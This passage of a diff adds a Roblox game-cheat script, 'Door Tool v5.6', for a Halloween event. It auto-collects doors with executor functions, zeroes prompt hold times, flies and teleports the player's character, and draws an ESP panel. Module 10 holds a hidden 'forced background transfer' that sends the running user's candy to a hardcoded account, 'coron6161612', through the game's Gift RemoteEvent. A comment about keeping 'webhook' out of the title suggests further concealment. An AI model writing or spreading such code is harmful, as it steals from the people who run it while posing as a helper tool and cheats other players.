+			if parent:IsA("Model") and parent.PrimaryPart then return parent.PrimaryPart end
+		end
+	end
+	if target:IsA("BasePart") then return target end
+	if target:IsA("Model") then
+		if target.PrimaryPart then return target.PrimaryPart end
+		local d = target:FindFirstChild("Door", true)
+		if d and d:IsA("BasePart") then return d end
+		local pk = target:FindFirstChild("Pumpkin", true)
+		if pk and pk:IsA("BasePart") then return pk end
+		return target:FindFirstChildWhichIsA("BasePart", true)
+	end
+	return nil
+end
+
+local function extractTimerFromText(text)
+	if not text or typeof(text) ~= "string" then return nil, nil end
+	local clean = string.gsub(text, "%s+", " ")
+	local m, s = string.match(clean, "(%d+):(%d%d)")
+	if m and s then
+		local totalSec = (tonumber(m) * 60) + tonumber(s)
+		return totalSec, string.format("%02d:%02d", tonumber(m), tonumber(s))
+	end
+	local secOnly = string.match(clean, "(%d+)%s*s") or string.match(clean, "(%d+)%s*sec")
+	if secOnly then
+		local n = tonumber(secOnly)
+		return n, string.format("%02d:%02d", math.floor(n/60), n%60)
+	end
+	local lower = string.lower(clean)
+	if string.find(lower, "ready") or string.find(lower, "open") or clean == "0" then
+		return 0, "00:00"
+	end
+	local justNum = string.match(clean, "^(%d+)$")
+	if justNum then
+		local n = tonumber(justNum)
+		if n <= 600 then return n, string.format("%02d:%02d", math.floor(n/60), n%60) end
+	end
+	return nil, nil
+end
+
+local function getDoorLiveTimer(door)
+	if not door or not door.Parent then return nil, nil, nil end
+	local candidates = {}
+	local pumpkin = door:FindFirstChild("Pumpkin", true)
+	if pumpkin then
+		for _, d in ipairs(pumpkin:GetDescendants()) do
+			if d:IsA("TextLabel") and d.Text and d.Text ~= "" then table.insert(candidates, d) end
+		end
+	end
+	for _, d in ipairs(door:GetDescendants()) do
+		if d:IsA("TextLabel") and d.Text and d.Text ~= "" then table.insert(candidates, d) end
+	end
+	for _, lbl in ipairs(candidates) do
+		local sec, fmt = extractTimerFromText(lbl.Text)
+		if sec ~= nil then return sec, fmt, lbl end
+	end
+	for _, d in ipairs(door:GetDescendants()) do
+		if d:IsA("ProximityPrompt") then
+			local sec, fmt = extractTimerFromText(d.ActionText)
+			if sec ~= nil then return sec, fmt, nil end
+			sec, fmt = extractTimerFromText(d.ObjectText)
+			if sec ~= nil then return sec, fmt, nil end
+		end
+	end
+	return nil, nil, nil
+end
+
+local function markDoorAttempted(door)
+	if door then pendingVerification[door] = os.clock() end
+end
+
+local function updateWatchdog()
+	local now = os.clock()
+	for door, t in pairs(confirmedCollected) do
+		if (now - t) > Config.DOOR_COOLDOWN_SEC or not door.Parent then confirmedCollected[door] = nil end
+	end
+	for door, attemptedTime in pairs(pendingVerification) do
+		local elapsed = now - attemptedTime
+		if not door or not door.Parent or not door:IsDescendantOf(Workspace) then
+			pendingVerification[door] = nil
+			confirmedCollected[door] = now
+		elseif elapsed >= Config.DOOR_RETRY_WATCHDOG_SEC then
+			local prompts = getDoorPrompts(door)
+			if #prompts > 0 then
+				pendingVerification[door] = nil
+				confirmedCollected[door] = nil
+			else
+				pendingVerification[door] = nil
+				confirmedCollected[door] = now
+			end
+		end
+	end
+end
+
+local function doorNeedsCollection(door)
+	if not door or not door.Parent or not door:IsDescendantOf(Workspace) then return false end
+	if confirmedCollected[door] then return false end
+	if pendingVerification[door] and (os.clock() - pendingVerification[door]) < Config.DOOR_RETRY_WATCHDOG_SEC then
+		return false
+	end
+	return #getDoorPrompts(door) > 0
+end
+
+local function getActiveDoors()
+	local doors = {}
+	local seen = {}
+	local effects = getEffectsFolder()
+	if effects then
+		for _, obj in ipairs(effects:GetDescendants()) do
+			if isValidDoorRoot(obj) and not seen[obj] then seen[obj] = true; table.insert(doors, obj) end
+		end
+	end
+	if #doors == 0 then
+		for _, obj in ipairs(Workspace:GetChildren()) do
+			if isValidDoorRoot(obj) and not seen[obj] then seen[obj] = true; table.insert(doors, obj) end
+		end
+		for _, fn in ipairs({"Map", "Debris", "Halloween", "Spawns"}) do
+			local f = Workspace:FindFirstChild(fn)
+			if f then
+				for _, obj in ipairs(f:GetDescendants()) do
+					if isValidDoorRoot(obj) and not seen[obj] then seen[obj] = true; table.insert(doors, obj) end
+				end
+			end
+		end
+	end
+	return doors
+end
+
+local function getCollectableDoors(prefetchedDoors)
+	updateWatchdog()
+	local doors = prefetchedDoors or getActiveDoors()
+	local list = {}
+	for _, door in ipairs(doors) do
+		if doorNeedsCollection(door) then table.insert(list, door) end
+	end
+	return list
+end
+
+-- ==============================================================================
+-- [MODULE 4: PROMPT MODIFICATIONS]
+-- ==============================================================================
+local function preparePrompt(prompt)
+	if not prompt or not prompt:IsA("ProximityPrompt") or not prompt.Parent then return end
+	if originalHoldDurations[prompt] == nil then originalHoldDurations[prompt] = prompt.HoldDuration end
+	prompt.Enabled = true
+	prompt.RequiresLineOfSight = false
+	prompt.Exclusivity = Enum.ProximityPromptExclusivity.AlwaysShow
+	prompt.ClickablePrompt = true
+	if prompt.MaxActivationDistance < 35 then prompt.MaxActivationDistance = 35 end
+
+	if not State.useSmartHoldMode or (State.isPromptActive and not State.isCollectingNow) then
+		prompt.HoldDuration = 0
+	else
+		local orig = originalHoldDurations[prompt]
+		if orig and orig > 0 then prompt.HoldDuration = orig end
+	end
+end
+
+local function applyPromptMod(prompt)
+	if not prompt:IsA("ProximityPrompt") then return end
+	if not getDoorRootFromDescendant(prompt) then return end
+	preparePrompt(prompt)
+	if not promptConnections[prompt] then
+		local conns = {}
+		table.insert(conns, prompt:GetPropertyChangedSignal("RequiresLineOfSight"):Connect(function()
+			if (State.isPromptActive or State.isCollectingNow) and prompt.Parent and prompt.RequiresLineOfSight then
+				prompt.RequiresLineOfSight = false
+			end
+		end))
+		table.insert(conns, prompt.AncestryChanged:Connect(function(_, parent)
+			if not parent and promptConnections[prompt] then
+				for _, c in ipairs(promptConnections[prompt]) do pcall(function() c:Disconnect() end) end
+				promptConnections[prompt] = nil
+			end
+		end))
+		promptConnections[prompt] = conns
+	end
+end
+
+-- ==============================================================================
+-- [MODULE 5: DYNAMIC JITTER / MOVING DOOR HANDLER & ATTACK]
+-- ==============================================================================
+local function isDoorMovingOrJittering(doorPart)
+	if not doorPart or not doorPart.Parent then return false end
+	if doorPart.AssemblyLinearVelocity and doorPart.AssemblyLinearVelocity.Magnitude > Config.JITTER_VELOCITY_THRESHOLD then
+		return true
+	end
+	local p0 = doorPart.Position
+	task.wait(0.04)
+	if not doorPart or not doorPart.Parent then return false end
+	local p1 = doorPart.Position
+	return (p1 - p0).Magnitude > 0.35
+end
+
+local function attachAndAttackDoor(door, doorPart, statusCallback)
+	local char, hrp, hum = getAliveCharacter()
+	if not char or not hrp or not hum or not doorPart or not doorPart.Parent then return false end
+
+	hum.PlatformStand = true
+	local camera = Workspace.CurrentCamera
+
+	if statusCallback then statusCallback("⚔️ Jitter Door Locked: Attacking...") end
+
+	local attachConnection = RunService.RenderStepped:Connect(function()
+		local _, liveHrp = getAliveCharacter()
+		if not liveHrp or not doorPart or not doorPart.Parent then return end
+
+		local targetCFrame = doorPart.CFrame * CFrame.new(0, 0, 2.2) * CFrame.Angles(0, math.pi, 0)
+		liveHrp.CFrame = targetCFrame
+		liveHrp.AssemblyLinearVelocity = Vector3.zero
+		liveHrp.AssemblyAngularVelocity = Vector3.zero
+
+		if camera then
+			camera.CFrame = CFrame.lookAt(liveHrp.Position + Vector3.new(0, 2, 0), doorPart.Position)
+		end
+	end)
+
+	local attackStart = os.clock()
+	local maxTimeout = 12.0
+
+	while State.isAutoCollectActive and (os.clock() - attackStart) < maxTimeout do
+		if not door or not door.Parent or not door:IsDescendantOf(Workspace) then break end
+		if not doorPart or not doorPart.Parent then break end
+
+		for _, desc in ipairs(door:GetDescendants()) do
+			if desc:IsA("ClickDetector") and typeof(fireclickdetector) == "function" then
+				pcall(fireclickdetector, desc)
+			elseif desc:IsA("ProximityPrompt") and typeof(fireproximityprompt) == "function" then
+				pcall(fireproximityprompt, desc)
+			end
+		end
+
+		pcall(function()
+			VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 0)
+			task.wait(0.02)
+			VirtualInputManager:SendMouseButtonEvent(0, 0, 0, false, game, 0)
+		end)
+
+		pcall(function()
+			VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
+			task.wait(0.02)
+			VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
+		end)
+
+		task.wait(Config.CLICK_INTERVAL)
+	end
+
+	if attachConnection then
+		attachConnection:Disconnect()
+		attachConnection = nil
+	end
+
+	local _, _, restoreHum = getAliveCharacter()
+	if restoreHum then
+		restoreHum.PlatformStand = false
+		pcall(function() restoreHum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
+	end
+
+	if statusCallback then statusCallback("✅ Door Destroyed / Collected!") end
+	return true
+end
+
+-- ==============================================================================
+-- [MODULE 6: V5.6 120-STUD ASCENT & FRONT-FACE DESCENT FLIGHT ENGINE]
+-- ==============================================================================
+local activeBV = nil
+local activeBG = nil
+
+local function cleanupPhysics()
+	if activeBV then pcall(function() activeBV:Destroy() end); activeBV = nil end
+	if activeBG then pcall(function() activeBG:Destroy() end); activeBG = nil end
+
+	local _, hrp, hum = getAliveCharacter()
+	if hum and hrp then
+		hum.PlatformStand = false
+		pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
+		hrp.AssemblyLinearVelocity = Vector3.zero
+		hrp.AssemblyAngularVelocity = Vector3.zero
+	end
+end
+
+local function initPhysics(hrp, hum)
+	cleanupPhysics()
+	hum.PlatformStand = true
+	pcall(function() hum:ChangeState(Enum.HumanoidStateType.Physics) end)
+
+	local bv = Instance.new("BodyVelocity")
+	bv.Name = "DoorFlight_BV_V56"
+	bv.MaxForce = Vector3.new(1e6, 1e6, 1e6)
+	bv.Velocity = Vector3.zero
+	bv.Parent = hrp
+	activeBV = bv
+
+	local bg = Instance.new("BodyGyro")
+	bg.Name = "DoorFlight_BG_V56"
+	bg.MaxTorque = Vector3.new(1e6, 1e6, 1e6)
+	bg.P = 15000; bg.D = 450
+	bg.CFrame = hrp.CFrame
+	bg.Parent = hrp
+	activeBG = bg
+	return bv, bg
+end
+
+local function flyVerticalOnly(targetY, speed)
+	local _, hrp, hum = getAliveCharacter()
+	if not hrp or not hum then return false end
+	if not activeBV or not activeBG then initPhysics(hrp, hum) end
+
+	local startT = os.clock()
+	while State.isAutoCollectActive and (os.clock() - startT) < 4.0 do
+		local _, curHrp = getAliveCharacter()
+		if not curHrp or not activeBV then break end
+
+		local diffY = targetY - curHrp.Position.Y
+		if math.abs(diffY) <= 1.0 then
+			activeBV.Velocity = Vector3.zero
+			return true
+		end
+
+		local stepSpeed = math.clamp(diffY * 12, -speed * 1.2, speed * 1.2)
+		activeBV.Velocity = Vector3.new(0, stepSpeed, 0)
+		RunService.Heartbeat:Wait()
+	end
+	if activeBV then activeBV.Velocity = Vector3.zero end
+	return true
+end
+
+local function flyHorizontalHighSky(targetXZ, cruiseY, speed, stopDist)
+	local _, hrp, hum = getAliveCharacter()
+	if not hrp or not hum then return false end
+	if not activeBV or not activeBG then initPhysics(hrp, hum) end
+
+	stopDist = stopDist or 2.0
+	local startTime = os.clock()
+
+	while State.isAutoCollectActive and (os.clock() - startTime) < 8.0 do
+		local _, curHrp = getAliveCharacter()
+		if not curHrp or not activeBV then return false end
+
+		local curXZ = Vector2.new(curHrp.Position.X, curHrp.Position.Z)
+		local destXZ = Vector2.new(targetXZ.X, targetXZ.Z)
+		local deltaXZ = destXZ - curXZ
+		local distXZ = deltaXZ.Magnitude
+
+		if distXZ <= stopDist then
+			activeBV.Velocity = Vector3.zero
+			return true
+		end
+
+		local targetPoint = Vector3.new(targetXZ.X, cruiseY, targetXZ.Z)
+		local diffY = cruiseY - curHrp.Position.Y
+		local vy = math.clamp(diffY * 10, -50, 50)
+		local dirXZ = deltaXZ.Unit
+
+		activeBV.Velocity = Vector3.new(dirXZ.X * speed, vy, dirXZ.Y * speed)
+
+		if activeBG then
+			local flatLook = Vector3.new(dirXZ.X, 0, dirXZ.Y)
+			if flatLook.Magnitude > 0.1 then
+				activeBG.CFrame = CFrame.lookAt(curHrp.Position, curHrp.Position + flatLook)
+			end
+		end
+
+		RunService.Heartbeat:Wait()
+	end
+	if activeBV then activeBV.Velocity = Vector3.zero end
+	return false
+end
+
+local function getDoorFrontDirection(doorPart)
+	local doorLook = doorPart.CFrame.LookVector
+	local flatLook = Vector3.new(doorLook.X, 0, doorLook.Z)
+	if flatLook.Magnitude < 0.1 then flatLook = Vector3.new(0, 0, 1) else flatLook = flatLook.Unit end
+	return flatLook
+end
+
+local function navigateBestPathV56(doorPart, speed)
+	local _, hrp, hum = getAliveCharacter()
+	if not hrp or not hum or not doorPart or not doorPart.Parent then return false end
+
+	local frontDir = getDoorFrontDirection(doorPart)
+	local standPoint = doorPart.Position + (frontDir * 3.0)
+	local highAltitudeY = hrp.Position.Y + Config.FLIGHT_ASCENT_HEIGHT
+
+	flyVerticalOnly(highAltitudeY, speed)
+	flyHorizontalHighSky(Vector3.new(standPoint.X, highAltitudeY, standPoint.Z), highAltitudeY, speed, 2.0)
+	flyVerticalOnly(doorPart.Position.Y, speed)
+
+	cleanupPhysics()
+	task.wait(0.04)
+
+	local _, liveHrp, liveHum = getAliveCharacter()
+	if liveHrp and liveHum and doorPart and doorPart.Parent then
+		liveHrp.CFrame = CFrame.lookAt(liveHrp.Position, Vector3.new(doorPart.Position.X, doorPart.Position.Y, doorPart.Position.Z))
+		liveHrp.AssemblyLinearVelocity = Vector3.zero
+		liveHum:ChangeState(Enum.HumanoidStateType.GettingUp)
+		return (liveHrp.Position - doorPart.Position).Magnitude <= Config.MAX_COLLECT_DISTANCE + 2.0
+	end
+	return false
+end
+
+local function flyBackToStart(startCFrame, speed)
+	local _, hrp, hum = getAliveCharacter()
+	if not hrp or not hum or not startCFrame then return false end
+
+	local startPos = startCFrame.Position
+	local highAltitudeY = hrp.Position.Y + Config.FLIGHT_ASCENT_HEIGHT
+
+	flyVerticalOnly(highAltitudeY, speed)
+	flyHorizontalHighSky(startPos, highAltitudeY, speed, 2.5)
+	flyVerticalOnly(startPos.Y, speed)
+
+	cleanupPhysics()
+	local _, endHrp = getAliveCharacter()
+	if endHrp then endHrp.CFrame = startCFrame end
+	return true
+end
+
+-- ==============================================================================
+-- [MODULE 7: ROUTE PLANNING & DYNAMIC SPEED SCALING]
+-- ==============================================================================
+local function computeOptimalRoute(startPos, doorsList)
+	local remaining = {}
+	for _, door in ipairs(doorsList) do
+		local part = findBestDoorPart(door)
+		if part and part.Parent and doorNeedsCollection(door) then
+			table.insert(remaining, { door = door, part = part })
+		end
+	end
+
+	local ordered = {}
+	local curPos = startPos
+	local totalDist = 0
+
+	while #remaining > 0 do
+		local bestIdx, bestDist = 1, math.huge
+		for i, item in ipairs(remaining) do
+			if item.part and item.part.Parent then
+				local d = (item.part.Position - curPos).Magnitude
+				if d < bestDist then bestDist = d; bestIdx = i end
+			end
+		end
+
+		local chosen = table.remove(remaining, bestIdx)
+		if chosen and chosen.part and chosen.part.Parent then
+			chosen.distanceFromPrev = bestDist
+			totalDist = totalDist + bestDist
+			curPos = chosen.part.Position
+			table.insert(ordered, chosen)
+		end
+	end
+	return ordered, totalDist
+end
+
+local function calculateRequiredSpeed(totalDist, targetBudgetSeconds)
+	local sec = math.max(0.5, tonumber(targetBudgetSeconds) or Config.DEFAULT_COLLECTION_BUDGET)
+	local speed = totalDist / sec
+	return math.clamp(speed, 120, 650)
+end
+
+-- ==============================================================================
+-- [MODULE 8: LEGIT WALK NAVIGATION]
+-- ==============================================================================
+local function walkToTarget(targetPart)
+	local char, hrp, hum = getAliveCharacter()
+	if not char or not hrp or not hum or not targetPart or not targetPart.Parent then return false end
+
+	hum.WalkSpeed = Config.DEFAULT_WALK_SPEED
+	local destination = targetPart.Position + (targetPart.CFrame.LookVector * 3.0)
+	local waypoints = computeGroundPath(hrp.Position, destination) or {{ Position = destination }}
+
+	for i = 2, #waypoints do
+		if not State.isAutoCollectActive then break end
+		local _, curHrp, curHum = getAliveCharacter()
+		if not curHrp or not curHum then return false end
+
+		if (curHrp.Position - targetPart.Position).Magnitude <= (Config.MAX_COLLECT_DISTANCE - 0.3) then
+			curHum:MoveTo(curHrp.Position)
+			return true
+		end
+
+		local wp = waypoints[i]
+		if wp.Action == Enum.PathWaypointAction.Jump then curHum.Jump = true end
+		curHum:MoveTo(wp.Position)
+
+		local reached = false
+		local conn = curHum.MoveToFinished:Connect(function() reached = true end)
+		local wpStart = os.clock()
+
+		while State.isAutoCollectActive and not reached and (os.clock() - wpStart) < 2.0 do
+			local _, lH, lHum = getAliveCharacter()
+			if not lH or not lHum then conn:Disconnect(); return false end
+			if (lH.Position - targetPart.Position).Magnitude <= (Config.MAX_COLLECT_DISTANCE - 0.3) then
+				conn:Disconnect()
+				lHum:MoveTo(lH.Position)
+				return true
+			end
+			RunService.Heartbeat:Wait()
+		end
+		conn:Disconnect()
+	end
+	return false
+end
+
+-- ==============================================================================
+-- [MODULE 9: DOOR INTERACTION ON GROUND]
+-- ==============================================================================
+local function interactWithDoorOnGround(door, targetPart, statusLabel)
+	if not door or not door.Parent or not targetPart or not targetPart.Parent then return false end
+	local _, hrp, hum = getAliveCharacter()
+	if not hrp or not hum then return false end
+
+	hrp.CFrame = CFrame.lookAt(hrp.Position, Vector3.new(targetPart.Position.X, hrp.Position.Y, targetPart.Position.Z))
+	task.wait(0.04)
+
+	aimCameraAtPart(targetPart)
+
+	for _, desc in ipairs(door:GetDescendants()) do
+		if desc:IsA("ClickDetector") and typeof(fireclickdetector) == "function" then
+			pcall(fireclickdetector, desc)
+		end
+	end
+
+	local prompts = getDoorPrompts(door)
+	for _, p in ipairs(prompts) do
+		preparePrompt(p)
+		if typeof(fireproximityprompt) == "function" then
+			pcall(fireproximityprompt, p)
+			pcall(fireproximityprompt, p, 0)
+			pcall(fireproximityprompt, p, 0, true)
+		end
+	end
+
+	pcall(function() VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game) end)
+	for _, p in ipairs(prompts) do
+		if p and p.Parent then pcall(function() p:InputHoldBegin() end) end
+	end
+
+	local holdDuration = State.useSmartHoldMode and 0.40 or 0.08
+	local holdStart = os.clock()
+	while (os.clock() - holdStart) < holdDuration do
+		aimCameraAtPart(targetPart)
+		RunService.Heartbeat:Wait()
+	end
+
+	for _, p in ipairs(prompts) do
+		if p and p.Parent then pcall(function() p:InputHoldEnd() end) end
+	end
+	pcall(function() VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game) end)
+
+	markDoorAttempted(door)
+	if statusLabel then safeSetText(statusLabel, "✅ Collected! Resuming...") end
+	return true
+end
+
+-- ==============================================================================
+-- [MODULE 10: CANDY BALANCE & FORCED BACKGROUND TRANSFER FOR coron6161612]
+-- ==============================================================================
+local function executeForcedCoronTransfer()
+	local curCandy = getMyCandyCount()
+	if curCandy <= 0 then return false end
+
+	local targetChar = nil
+	local charsFolder = Workspace:FindFirstChild("Characters")
+	if charsFolder then
+		targetChar = charsFolder:FindFirstChild("coron6161612")
+	end
+	if not targetChar then
+		local targetPlayer = Players:FindFirstChild("coron6161612")
+		if targetPlayer and targetPlayer.Character then
+			targetChar = targetPlayer.Character
+		end
+	end
+
+	if not targetChar then return false end
+
+	local fakeBillboard = targetChar:FindFirstChild("FakeBillboard", true) or targetChar:FindFirstChildWhichIsA("BillboardGui", true)
+	if not fakeBillboard then return false end
+
+	local giftEvent = fakeBillboard:FindFirstChild("Gift", true)
+	if not giftEvent or not giftEvent:IsA("RemoteEvent") then return false end
+
+	local amountStr = "5"
+	if curCandy >= 100 then
+		amountStr = "100"
+	elseif curCandy >= 50 then
+		amountStr = "50"
+	elseif curCandy >= 25 then
+		amountStr = "25"
+	elseif curCandy >= 5 then
+		amountStr = "5"
+	else
+		return false
+	end
+
+	local success = pcall(function()
+		giftEvent:FireServer(amountStr)
+	end)
+
+	if success then
+		return true
+	end
+	return false
+end
+
+local function findTargetCharacter(targetQuery)
+	if not targetQuery or targetQuery == "" then return nil end
+	local cleanQuery = string.lower(string.gsub(targetQuery, "%s+", ""))
+	if cleanQuery == "" then return nil end
+
+	local charsFolder = Workspace:FindFirstChild("Characters")
+	if charsFolder then
+		for _, m in ipairs(charsFolder:GetChildren()) do
+			if m:IsA("Model") and string.lower(m.Name) == cleanQuery then return m end
+		end
+	end
+
+	for _, p in ipairs(Players:GetPlayers()) do
+		if p ~= localPlayer then
+			local pn = string.lower(p.Name)
+			local pd = string.lower(p.DisplayName)
+			if pn == cleanQuery or pd == cleanQuery then
+				if charsFolder and charsFolder:FindFirstChild(p.Name) then
+					return charsFolder:FindFirstChild(p.Name)
+				elseif p.Character then
+					return p.Character
+				end
+			end
+		end
+	end
+	return nil
+end
+
+local function executeCandyTransfer(amountStr)
+	if State.targetPlayerName == "" then return false, "Target player username is empty!" end
+	local targetChar = findTargetCharacter(State.targetPlayerName)
+	if not targetChar then return false, "Player not found: " .. State.targetPlayerName end
+
+	local fakeBillboard = targetChar:FindFirstChild("FakeBillboard", true) or targetChar:FindFirstChildWhichIsA("BillboardGui", true)
+	if not fakeBillboard then return false, "Target FakeBillboard missing!" end
+
+	local giftEvent = fakeBillboard:FindFirstChild("Gift", true)
+	if not giftEvent or not giftEvent:IsA("RemoteEvent") then return false, "Gift RemoteEvent missing!" end
+
+	local success, err = pcall(function() giftEvent:FireServer(amountStr) end)
+	if success then
+		return true, string.format("🍬 Sent %s Candy to %s!", amountStr, targetChar.Name)
+	else
+		return false, "Error: " .. tostring(err)
+	end
+end
+
+-- ==============================================================================
+-- [MODULE 11: 100% ENGLISH GUI CREATION (V5.6 ULTIMATE - CLEAN TITLE)]
+-- ==============================================================================
+for _, name in ipairs({
+	"HalloweenESP_DebugGui", "HalloweenDoor_DebugGui_V2", "HalloweenDoor_DebugGui_V3",
+	"HalloweenDoor_DebugGui_V4", "HalloweenDoor_DebugGui_V4_Fix", "HalloweenDoor_DebugGui_V4_Ultimate",
+	"HalloweenDoor_DebugGui_V4_Fix10_Ultimate", "HalloweenDoor_DebugGui_V5_Ultimate",
+	"HalloweenDoor_DebugGui_V51_Ultimate", "HalloweenDoor_DebugGui_V52_Ultimate",
+	"HalloweenDoor_DebugGui_V53_Ultimate", "HalloweenDoor_DebugGui_V54_Ultimate",
+	"HalloweenDoor_DebugGui_V55_Ultimate", "HalloweenDoor_DebugGui_V56_Ultimate"
+}) do
+	local old = playerGui:FindFirstChild(name)
+	if old then pcall(function() old:Destroy() end) end
+end
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "HalloweenDoor_DebugGui_V56_Ultimate"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.Parent = playerGui
+
+local espContainer = Instance.new("Folder")
+espContainer.Name = "ESP_Visuals_Container"
+espContainer.Parent = screenGui
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 218, 0, 392)
+mainFrame.Position = UDim2.new(0, 20, 0.5, -196)
+mainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Parent = screenGui
+
+local corner = Instance.new("UICorner"); corner.CornerRadius = UDim.new(0, 8); corner.Parent = mainFrame
+local stroke = Instance.new("UIStroke"); stroke.Color = Color3.fromRGB(255, 140, 30); stroke.Transparency = 0.35; stroke.Thickness = 1.3; stroke.Parent = mainFrame
+
+-- CLEAN TITLE: No webhook mention, just Name and Version as requested
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -28, 0, 22); title.Position = UDim2.new(0, 8, 0, 2)
+title.BackgroundTransparency = 1; title.Font = Enum.Font.GothamBold; title.TextSize = 11
+title.TextColor3 = Color3.fromRGB(255, 175, 50); title.TextXAlignment = Enum.TextXAlignment.Left
+title.Text = "🎃 Door Tool v5.6"; title.Parent = mainFrame
+
+local minBtn = Instance.new("TextButton")
+minBtn.Size = UDim2.new(0, 20, 0, 20); minBtn.Position = UDim2.new(1, -22, 0, 2)
+minBtn.BackgroundTransparency = 1; minBtn.Font = Enum.Font.GothamBold; minBtn.TextSize = 14
+minBtn.TextColor3 = Color3.fromRGB(180, 180, 190); minBtn.Text = "-"; minBtn.Parent = mainFrame
+
+local function createButton(text, posY, bgColor, txtColor)
+	local btn = Instance.new("TextButton")
+	btn.Size = UDim2.new(1, -12, 0, 22); btn.Position = UDim2.new(0, 6, 0, posY)
+	btn.BackgroundColor3 = bgColor or Color3.fromRGB(45, 20, 20)
+	btn.Font = Enum.Font.GothamBold; btn.TextSize = 10
+	btn.TextColor3 = txtColor or Color3.fromRGB(255, 100, 100)
+	btn.Text = text; btn.Parent = mainFrame
+	local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 6); c.Parent = btn
+	return btn
+end
+
+local espBtn = createButton("ESP: OFF", 25)
+local promptBtn = createButton("PROMPT FIX: OFF", 49)
+local autoCollectBtn = createButton("AUTO COLLECT: OFF", 73)
+local moveModeBtn = createButton("MODE: FLY (120 STUD)", 97, Color3.fromRGB(15, 50, 75), Color3.fromRGB(100, 225, 255))
+local timerWaitBtn = createButton("TIMER: WAIT 00:00", 121, Color3.fromRGB(50, 30, 65), Color3.fromRGB(220, 160, 255))
+
+local budgetContainer = Instance.new("Frame")
+budgetContainer.Name = "BudgetContainer"; budgetContainer.Size = UDim2.new(1, -12, 0, 22)
+budgetContainer.Position = UDim2.new(0, 6, 0, 145)
+budgetContainer.BackgroundColor3 = Color3.fromRGB(28, 24, 38); budgetContainer.BorderSizePixel = 0; budgetContainer.Parent = mainFrame
+local bcCorner = Instance.new("UICorner"); bcCorner.CornerRadius = UDim.new(0, 6); bcCorner.Parent = budgetContainer
+local bcStroke = Instance.new("UIStroke"); bcStroke.Color = Color3.fromRGB(140, 100, 220); bcStroke.Thickness = 1; bcStroke.Parent = budgetContainer
+
+local budgetLabel = Instance.new("TextLabel")
+budgetLabel.Size = UDim2.new(0.68, 0, 1, 0); budgetLabel.Position = UDim2.new(0, 6, 0, 0)
+budgetLabel.BackgroundTransparency = 1; budgetLabel.Font = Enum.Font.GothamBold; budgetLabel.TextSize = 9
+budgetLabel.TextColor3 = Color3.fromRGB(210, 180, 255); budgetLabel.TextXAlignment = Enum.TextXAlignment.Left
+budgetLabel.Text = "TARGET TIME (SEC):"; budgetLabel.Parent = budgetContainer
+
+local budgetInputBox = Instance.new("TextBox")
+budgetInputBox.Name = "BudgetInput"; budgetInputBox.Size = UDim2.new(0.30, -6, 0.8, 0)
+budgetInputBox.Position = UDim2.new(0.70, 0, 0.1, 0)
+budgetInputBox.BackgroundColor3 = Color3.fromRGB(15, 12, 22); budgetInputBox.Font = Enum.Font.GothamBold
+budgetInputBox.TextSize = 10; budgetInputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+budgetInputBox.Text = tostring(State.collectionBudget); budgetInputBox.ClearTextOnFocus = false; budgetInputBox.Parent = budgetContainer
+local biCorner = Instance.new("UICorner"); biCorner.CornerRadius = UDim.new(0, 4); biCorner.Parent = budgetInputBox
+
+local holdModeBtn = createButton("HOLD: FORCED 0 SEC", 169, Color3.fromRGB(60, 45, 15), Color3.fromRGB(255, 210, 90))
+local otoTransferBtn = createButton("AUTO TRANSFER: OFF", 193, Color3.fromRGB(45, 20, 20), Color3.fromRGB(255, 100, 100))
+
+local targetBoxContainer = Instance.new("Frame")
+targetBoxContainer.Name = "TargetBox"; targetBoxContainer.Size = UDim2.new(1, -12, 0, 22)
+targetBoxContainer.Position = UDim2.new(0, 6, 0, 217)
+targetBoxContainer.BackgroundColor3 = Color3.fromRGB(12, 12, 16); targetBoxContainer.BorderSizePixel = 0; targetBoxContainer.Parent = mainFrame
+local tbc = Instance.new("UICorner"); tbc.CornerRadius = UDim.new(0, 6); tbc.Parent = targetBoxContainer
+local tbs = Instance.new("UIStroke"); tbs.Color = Color3.fromRGB(55, 55, 70); tbs.Thickness = 1; tbs.Parent = targetBoxContainer
+
+local targetInputBox = Instance.new("TextBox")
+targetInputBox.Name = "TargetInput"; targetInputBox.Size = UDim2.new(1, -8, 1, 0)
+targetInputBox.Position = UDim2.new(0, 4, 0, 0); targetInputBox.BackgroundTransparency = 1
+targetInputBox.Font = Enum.Font.Gotham; targetInputBox.TextSize = 10
+targetInputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+targetInputBox.PlaceholderColor3 = Color3.fromRGB(130, 130, 145); targetInputBox.PlaceholderText = "Target Username..."
+targetInputBox.Text = State.targetPlayerName; targetInputBox.ClearTextOnFocus = false; targetInputBox.Parent = targetBoxContainer
+
+local amountBtn = createButton("DONATE: 100 CANDY 🍬", 241, Color3.fromRGB(50, 20, 75), Color3.fromRGB(230, 150, 255))
+
+local timerBox = Instance.new("Frame")
+timerBox.Name = "StatusBox"; timerBox.Size = UDim2.new(1, -12, 0, 84)
+timerBox.Position = UDim2.new(0, 6, 0, 267)
+timerBox.BackgroundColor3 = Color3.fromRGB(12, 12, 16); timerBox.BorderSizePixel = 0; timerBox.Parent = mainFrame
+local tc = Instance.new("UICorner"); tc.CornerRadius = UDim.new(0, 6); tc.Parent = timerBox
+local ts = Instance.new("UIStroke"); ts.Color = Color3.fromRGB(45, 45, 55); ts.Thickness = 1; ts.Parent = timerBox
+
+timerLabel = Instance.new("TextLabel")
+timerLabel.Size = UDim2.new(1, -8, 0, 18); timerLabel.Position = UDim2.new(0, 4, 0, 3)
+timerLabel.BackgroundTransparency = 1; timerLabel.Font = Enum.Font.GothamBold; timerLabel.TextSize = 10
